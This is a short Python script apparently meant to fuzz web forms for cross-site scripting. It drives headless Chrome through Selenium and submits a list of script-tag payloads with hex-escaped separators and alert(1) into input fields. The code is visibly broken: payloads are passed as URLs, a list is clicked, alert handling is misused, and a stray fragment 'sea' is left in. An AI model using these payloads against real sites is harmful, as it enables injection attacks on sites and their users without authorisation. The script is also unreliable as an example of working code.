from concurrent.futures import ProcessPoolExecutor


def scrap(q):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    chrome_options = Options()

    #chrome_options.add_argument("--disable-extensions")

    #chrome_options.add_argument("--disable-gpu")

    chrome_options.add_argument("--headless")
    driver= webdriver.Chrome("C:\\Users\\Sumit\\OneDrive\\Desktop\\chromedriver.exe", options = chrome_options)
    driver.get(q)
    search = driver.find_elements_by_tag_name("input")
    search.click()
    driver.switch_to_alert.dismiss()
    search.click()
    driver.switch_to_alert.accept()


    sea
    for s in search:
        s.send_keys(q)

List = ['<script\x20type="text/javascript">javascript:alert(1);</script>', 
'<script\x3Etype="text/javascript">javascript:alert(1);</script>',
'<script\x0Dtype="text/javascript">javascript:alert(1);</script>',
'<script\x09type="text/javascript">javascript:alert(1);</script>',
'<script\x0Ctype="text/javascript">javascript:alert(1);</script>',
'<script\x2Ftype="text/javascript">javascript:alert(1);</script>',
'<script\x0Atype="text/javascript">javascript:alert(1);</script>']

def main():
    
    with ProcessPoolExecutor(max_workers = 3) as executor:
        executor.map(scrap, List)

if __name__ == "__main__":
    main()



